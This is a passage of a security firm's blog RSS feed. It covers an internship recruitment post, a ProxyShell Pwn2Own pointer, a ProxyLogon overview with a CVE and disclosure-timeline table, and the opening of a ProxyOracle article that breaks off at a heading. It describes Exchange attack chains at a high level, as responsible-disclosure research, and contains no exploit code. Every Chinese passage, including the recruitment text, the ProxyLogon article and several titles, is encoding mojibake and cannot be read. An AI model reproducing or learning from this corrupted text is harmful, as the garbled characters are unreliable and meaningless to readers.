&lt;h4 id=&quot;Á¨¨‰∏âÈöéÊÆµÈù¢Ë©¶&quot;&gt;Á¨¨‰∏âÈöéÊÆµÔºöÈù¢Ë©¶&lt;/h4&gt;
&lt;p&gt;Ê≠§ÈöéÊÆµÁÇ∫ 1~2 Â∞èÊôÇÁöÑÈù¢Ë©¶ÔºåÊúÉÊúâ 2~3 ‰ΩçË≥áÊ∑±Â§•‰º¥ÂèÉËàáÔºåË©ï‰º∞ÊÇ®ÊòØÂê¶ÂÖ∑ÂÇôÊú¨Ê¨°ÂØ¶ÁøíÊâÄÈúÄÁöÑÊäÄË°ìËÉΩÂäõËàá‰∫∫Ê†ºÁâπË≥™„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Â†±ÂêçÊñπÂºè&quot;&gt;Â†±ÂêçÊñπÂºè&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Ë´ãÂ∞áÊÇ®ÁöÑ&lt;strong&gt;Â±•Ê≠∑&lt;/strong&gt;Âèä&lt;strong&gt;Á∞°Á≠îÈ°åÁ≠îÊ°à&lt;/strong&gt;ÂÅöÊàê‰∏Ä‰ªΩ PDF Ê™îÂØÑÂà∞ recruiting_intern@devco.re
    &lt;ul&gt;
      &lt;li&gt;Â±•Ê≠∑Ê†ºÂºèË´ãÂèÉËÄÉÁØÑ‰æãÁ§∫ÊÑèÔºà&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOCX&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;„ÄÅ&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;Ôºâ‰∏¶ËΩâÊàê PDF„ÄÇËã•ÊÇ®ÊúâËá™‰ø°Ôºå‰πüÂèØ‰ª•Ëá™Áî±ÁôºÊèÆÊúÄËÉΩÂëàÁèæÊÇ®ËÉΩÂäõÁöÑÂ±•Ê≠∑„ÄÇ&lt;/li&gt;
      &lt;li&gt;Ë´ãÊñº 2022/02/11 ÂâçÂØÑÂá∫ÔºàÂ¶ÇÊûúÂêçÈ°çÂ∑≤ÊªøÂâáË¶ñÊÉÖÊ≥ÅÊèêÊó©ÁµêÊùüÔºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;‰ø°‰ª∂Ê®ôÈ°åÊ†ºÂºèÔºö[ÊáâÂæµ] ËÅ∑‰Ωç ÊÇ®ÁöÑÂßìÂêçÔºàÁØÑ‰æãÔºö[ÊáâÂæµ] Web ÁµÑÂØ¶ÁøíÁîü ÁéãÂ∞èÁæéÔºâ&lt;/li&gt;
  &lt;li&gt;Â±•Ê≠∑ÂÖßÂÆπË´ãÂãôÂøÖÊéßÂà∂Âú®ÂÖ©È†Å‰ª•ÂÖßÔºåËá≥Â∞ëÈúÄÂåÖÂê´‰ª•‰∏ãÂÖßÂÆπÔºö
    &lt;ul&gt;
      &lt;li&gt;Âü∫Êú¨Ë≥áÊñô&lt;/li&gt;
      &lt;li&gt;Â≠∏Ê≠∑&lt;/li&gt;
      &lt;li&gt;ÂØ¶ÁøíÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;Á§æÁæ§Ê¥ªÂãïÁ∂ìÊ≠∑&lt;/li&gt;
      &lt;li&gt;ÁâπÊÆä‰∫ãËπü&lt;/li&gt;
      &lt;li&gt;ÈÅéÂéªÂ∞çÊñºË≥áÂÆâÁöÑÁõ∏ÈóúÁ†îÁ©∂&lt;/li&gt;
      &lt;li&gt;Â∞çÊñºÈÄô‰ªΩÂØ¶ÁøíÁöÑÊúüÊúõ&lt;/li&gt;
      &lt;li&gt;MBTI ËÅ∑Ê•≠ÊÄßÊ†ºÊ∏¨Ë©¶ÁµêÊûúÔºà&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;Ê∏¨Ë©¶Á∂≤È†Å&lt;/a&gt;Ôºâ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Á∞°Á≠îÈ°åÈ°åÁõÆÂ¶Ç‰∏ãÔºåË´ã‰æùÁÖßÊ¨≤Áî≥Ë´ã‰πãÁµÑÂà•ÂõûÁ≠îÔºåÁ≠îÊ°àÈ†ÅÊï∏‰∏çÈôêÔºåÂèØËá™Áî±ÁôºÊèÆ
    &lt;ul&gt;
      &lt;li&gt;Binary
        &lt;ul&gt;
          &lt;li&gt;ÂÅáË®≠‰Ω†‰ªäÂ§©Ë¶ÅÂàÜÊûê‰∏ÄÂÄã C/C++ ÂØ´ÁöÑ web serverÔºåÂú®Á®ãÂºèÂü∑Ë°åÈÅéÁ®ã‰∏≠Ôºå‰Ω†Ë¶∫ÂæóÊúâÂì™‰∫õÂú∞ÊñπÂèØËÉΩÊúÉÁôºÁîüÂïèÈ°åÂ∞éËá¥Á®ãÂºèÊµÅÁ®ãË¢´Âä´ÊåÅÔºüÁÇ∫‰ªÄÈ∫ºÔºü&lt;/li&gt;
          &lt;li&gt;Âú® Linux Ê©üÂô®‰∏äÔºåÁï∂ÊàëÂÄëÂú®Â∞ç CGI ÈÄ≤Ë°åÂàÜÊûêÊôÇÔºåÁî±Êñº CGI ÊòØÁî± apache ÊâÄÂëºÂè´‰∏¶ÂÇ≥ÈÅû inputÔºå‰∏îÂú®Âü∑Ë°åÂæåÊúÉÁ´ãÂç≥ÁµêÊùüÔºåÈÄôÁ®ÆÁ®ãÂºè‰Ω†ÊúÉÂ¶Ç‰Ωï debug ?&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Web
        &lt;ul&gt;
          &lt;li&gt;Áï∂‰Ω†Âú®Á∂≤È†ÅÁÄèË¶ΩÂô®ÁöÑÁ∂≤ÂùÄÂàó‰∏äËº∏ÂÖ•‰∏Ä‰∏≤Á∂≤ÂùÄÔºà‰æãÂ¶ÇÔºö&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://site.fake.devco.re/index.php?foo=bar&lt;/code&gt;ÔºâÔºåÈö®ÂæåÊåâ‰∏ã Enter ÈçµÂà∞Âá∫ÁèæÁ∂≤È†ÅÁï´Èù¢ÁÇ∫Ê≠¢ÔºåË´ãÂïè‰∏≠ÈñìÁôºÁîü‰∫Ü‰ªÄÈ∫º‰∫ãÊÉÖÔºüË´ãÊ†πÊìö‰Ω†ÊâÄÁü•ÁöÑÁü•Ë≠òËÉåÊôØÔºå‰ª•ÊñáÂ≠óÁõ°ÂèØËÉΩË™™Êòé„ÄÇ&lt;/li&gt;
          &lt;li&gt;‰æùÊìöÂâçËø∞ÂïèÈ°åÁöÑÁ≠îÊ°àÔºåÂÖÅË®±Èö®ÊÑèË®≠ÊÉ≥‰ªª‰Ωï‰∏ÄÂÄãÊÉÖÂ¢ÉÔºå‰∏¶‰ª•ÊñáÂ≠óÁõ°ÂèØËÉΩË™™ÊòéÂú®ÊÉÖÂ¢ÉÁöÑÂêÑÂÄãÁí∞ÁØÄ‰∏≠ÂèØËÉΩÁôºÁîüÁöÑ‰ªª‰ΩïÂÆâÂÖ®Ë≠∞È°åÊàñËÄÖÊîªÊìäÁõÆÊ®ô„ÄÅÊîªÊìäÈù¢Âêë„ÄÇ&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ëã•ÊúâÊáâÂæµÁõ∏ÈóúÂïèÈ°åÔºåË´ã‰∏ÄÂæã‰ΩøÁî® Email ËÅØÁπ´ÔºåÂ¶ÇÈÄ†ÊàêÊÇ®ÁöÑ‰∏ç‰æøË´ãË¶ãË´íÔºåÊàëÂÄëÊÑüË¨ùÊÇ®ÁöÑ‰æÜ‰ø°Ôºå‰∏¶ÊúüÂæÖÊÇ®ÁöÑÂä†ÂÖ•ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/01/27/intern-recruit/</link>
                <guid>https://devco.re/blog/2022/01/27/intern-recruit</guid>
                <pubDate>Thu, 27 Jan 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 3 - ProxyShell!</title>
                <description>&lt;p&gt;This is a guest post DEVCORE collaborated with Zero Day Initiative (ZDI) and published at their blog, which describes the exploit chain we demonstrated at Pwn2Own 2021! Please visit the following link to read that :)&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&quot;&gt;FROM PWN2OWN 2021: A NEW ATTACK SURFACE ON MICROSOFT EXCHANGE - PROXYSHELL!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;If you are interesting in more Exchange Server attacks, you can also check our series of articles:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With ProxyShell, an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an exposed 443 port! Here is the &lt;a href=&quot;https://youtu.be/FC6iHw258RI&quot;&gt;demonstration video&lt;/a&gt;:&lt;/p&gt;

&lt;div style=&quot;text-align: center&quot;&gt;
&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/FC6iHw258RI&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/</link>
                <guid>https://devco.re/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell</guid>
                <pubDate>Sun, 22 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ProxyLogon ÂÉÖÂÉÖÂè™ÊòØÂÜ∞Â±±‰∏ÄËßíÔºå‰∏ÄÂÄãÈáùÂ∞ç Microsoft Exchange Server ÁöÑÂÖ®Êñ∞ÊîªÊìäÈù¢ÔºÅ</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.6em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;Microsoft Exchange Server ‰ΩúÁÇ∫Áï∂‰ªä‰∏ñÁïå‰∏äÊúÄÂ∏∏Ë¶ãÁöÑÈÉµ‰ª∂Ëß£Ê±∫ÊñπÊ°àÔºåÂ∑≤Á∂ìÂπæ‰πéÊòØ‰ºÅÊ•≠‰ª•ÂèäÊîøÂ∫úÊØèÊó•Â∑•‰ΩúËàáÁ∂≠Áπ´ÂÆâÂÖ®‰∏çÂèØÊàñÁº∫ÁöÑ‰∏ÄÈÉ®ÂàÜÔºÅÂú®‰ªäÂπ¥‰∏ÄÊúàÔºåÊàëÂÄëÂõûÂ†±‰∫Ü‰∏ÄÁ≥ªÂàóÁöÑ Exchange Server ÊºèÊ¥ûÁµ¶ MicrosoftÔºå‰∏¶‰∏îÂ∞áÈÄôÂÄãÊºèÊ¥ûÂÆÉÂëΩÂêçÁÇ∫ &lt;a href=&quot;https://proxylogon.com/&quot;&gt;ProxyLogon&lt;/a&gt;ÔºåÁõ∏‰ø°Â¶ÇÊûúÊÇ®ÊúâÂú®ÈóúÊ≥®Ê•≠ÁïåÊñ∞ËÅûÔºå‰∏ÄÂÆö‰πüËÅΩÈÅéÈÄôÂÄãÂêçÂ≠óÔºÅProxyLogon ‰πüË®±ÊòØ Exchange Ê≠∑Âè≤‰∏äÊúÄÂö¥Èáç„ÄÅÂΩ±ÈüøÂäõ‰πüÊúÄÂ§ßÁöÑ‰∏ÄÂÄãÊºèÊ¥ûÔºÅ&lt;/p&gt;

&lt;p&gt;Èö®ËëóÊõ¥Ê∑±ÂÖ•ÁöÑÂæûÊû∂ÊßãÂ±§ÂéªÁ†îÁ©∂ ProxyLogonÔºåÊàëÂÄëÁôºÁèæÂÆÉ‰∏çÂÉÖÂÉÖÂè™ÊòØ‰∏ÄÂÄãÊºèÊ¥ûÔºåËÄåÊòØ‰∏ÄÊï¥ÂÄãÊñ∞ÁöÑ„ÄÅÊ≤íÊúâ‰∫∫ÊèêÈÅéÁöÑÊîªÊìäÈù¢ÂèØËÆìÈß≠ÂÆ¢ÊàñÂÆâÂÖ®Á†îÁ©∂Âì°ÂéªÊåñÊéòÊõ¥Â§öÁöÑÊºèÊ¥û„ÄÇÂõ†Ê≠§ÊàëÂÄëÂ∞àÊ≥®Ê∑±ÂÖ•Á†îÁ©∂ÈÄôÂÄãÊîªÊìäÈù¢Ôºå‰∏¶Âæû‰∏≠ÁôºÁèæ‰∫ÜËá≥Â∞ëÂÖ´ÂÄãÊºèÊ¥ûÔºåÈÄô‰∫õÊºèÊ¥ûÊ∂µËìã‰∫Ü‰º∫ÊúçÂô®Á´Ø„ÄÅÂÆ¢Êà∂Á´ØÔºåÁîöËá≥ÂØÜÁ¢ºÂ≠∏ÊºèÊ¥ûÔºåÊàëÂÄë‰∏¶Â∞áÈÄô‰∫õÊºèÊ¥ûÁµÑÂêàÊàê‰∫Ü‰∏âÂÄãÊîªÊìäÈèàÔºö&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ProxyLogon: ÊúÄÁü•Âêç„ÄÅÂΩ±ÈüøÂäõ‰πüÊúÄÂ§ßÁöÑ Exchange ÊîªÊìäÈèà&lt;/li&gt;
  &lt;li&gt;ProxyOracle: ‰∏ÄÂÄãÂèØ‰ª•ÈÇÑÂéü‰ªªÊÑè Exchange ‰ΩøÁî®ËÄÖÊòéÊñáÂØÜÁ¢ºÁöÑÊîªÊìäÈèà&lt;/li&gt;
  &lt;li&gt;ProxyShell: ÊàëÂÄëÂú® Pwn2Own 2021 ‰∏äÂ±ïÁ§∫ÊâìÊéâ Exchange ÁöÑÊîªÊìäÈèà&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210807/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊâÄÊúâÊàëÂÄëÊâæÂà∞ÁöÑÊºèÊ¥ûÈÉΩÊòØÈÇèËºØÊºèÊ¥ûÔºåÈÄô‰ª£Ë°®Áõ∏ËºÉÊñºË®òÊÜ∂È´îÊØÄÊêçÈ°ûÂûãÁöÑÊºèÊ¥ûÔºåÈÄô‰∫õÊºèÊ¥ûÊõ¥ÂÆπÊòìË¢´ÈáçÁèæ‰ª•ÂèäÂà©Áî®ÔºåÊàëÂÄë‰πüÂ∞áÊàêÊûúÁôºË°®Ëá≥ &lt;a href=&quot;https://www.blackhat.com/us-21/briefings/schedule/index.html#proxylogon-is-just-the-tip-of-the-iceberg-a-new-attack-surface-on-microsoft-exchange-server-23442&quot;&gt;Black Hat USA&lt;/a&gt; Âèä &lt;a href=&quot;https://defcon.org/html/defcon-29/dc-29-speakers.html#tsai&quot;&gt;DEFCON&lt;/a&gt; ‰∏äÔºå‰πüÂêåÊôÇÁç≤Âæó‰∫Ü 2021 Pwnie Awards Âπ¥Â∫¶ Best Server-Side Bug ÁçéÈ†ÖÔºåÂ¶ÇÊûú‰Ω†ÊúâËààË∂£ÁöÑË©±ÂèØ‰ª•ÂæûÈÄôÈÇä‰∏ãËºâÊúÉË≠∞ÁöÑÊäïÂΩ±Áâá!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! &lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf&quot;&gt;[ÊäïÂΩ±Áâá]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=5mqid-7zp8k&quot;&gt;[ÂΩ±Áâá]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Êú¨Ê¨°ÊèêÂèäÁöÑÊºèÊ¥ûÁöÜÁ∂ìÈÅéË≤†Ë≤¨‰ªªÁöÑÊºèÊ¥ûÊé•Èú≤Á®ãÂ∫èÂõûÂ†±Áµ¶ÂæÆËªü„ÄÅ‰∏¶Áç≤Âæó‰øÆÂæ©ÔºåÊÇ®ÂèØ‰ª•Âæû‰∏ãÈù¢ÈÄôÂºµÂúñÊü•ÁúãË©≥Á¥∞ÁöÑÊºèÊ¥ûÁ∑®ËôüÂèäÂõûÂ†±ÊôÇÈñìË°®„ÄÇ&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Report Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CVE&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Patch Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CAS&lt;sup&gt;[1]&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Reported By&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473&quot;&gt;CVE-2021-34473&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523&quot;&gt;CVE-2021-34523&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207&quot;&gt;CVE-2021-31207&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai and Dlive&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div style=&quot;font-size:0.6em; line-height: 1.6;&quot;&gt;
&lt;br /&gt;&lt;em&gt;[1] Bugs relate to this new attack surface direclty&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;[2] Pwn2Own 2021 bugs&lt;/em&gt;
&lt;/div&gt;

&lt;p&gt;Êõ¥Ë©≥Áõ°ÁöÑÊäÄË°ìÁ¥∞ÁØÄÊàëÂÄëÂ∑≤Èô∏Á∫åÂÖ¨Â∏ÉÔºåÂæåÁ∫åÈÄ£ÁµêÊúÉÊåÅÁ∫åÊõ¥Êñ∞ÊñºÊú¨ÊñáÔºåÊï¨Ë´ãÊúüÂæÖÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2021/08/07/a-new-attack-surface-on-MS-exchange/</link>
                <guid>https://devco.re/blog/2021/08/07/a-new-attack-surface-on-MS-exchange</guid>
                <pubDate>Sat, 07 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 2 - ProxyOracle!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;Hi, this is the part 2 of the New MS Exchange Attack Surface. Because this article refers to several architecture introductions and attack surface concepts in the previous article, you could find the first piece here:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This time, we will be introducing ProxyOracle. Compared with ProxyLogon, ProxyOracle is an interesting exploit with a different approach. By simply leading a user to visit a malicious link, ProxyOracle allows an attacker to recover the user‚Äôs password in plaintext  format completely. ProxyOracle consists of two vulnerabilities:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt; - Reflected Cross-Site Scripting&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt; - Padding Oracle Attack on Exchange Cookies Parsing&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;where-is-proxyoracle&quot;&gt;Where is ProxyOracle&lt;/h1&gt;

&lt;p&gt;So where is ProxyOracle? Based on the CAS architecture we introduced before, the Frontend of CAS will first serialize the User Identity to a string and put it in the header of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt;. The header will be merged into the client‚Äôs HTTP request and sent to the Backend later. Once the Backend receives, it deserializes the header back to the original User Identity in Frontend.&lt;/p&gt;

&lt;p&gt;We now know how the Frontend and Backend synchronize the User Identity. The next is to explain how the Frontend knows who you are and processes your credentials. The Outlook Web Access (OWA) uses a fancy interface to handle the whole login mechanism, which is called Form-Based Authentication (FBA). The FBA is a special IIS module that inherits the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProxyModule&lt;/code&gt; and is responsible for executing the transformation between the credentials and cookies before entering the proxy logic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;the-fba-mechanism&quot;&gt;The FBA Mechanism&lt;/h1&gt;

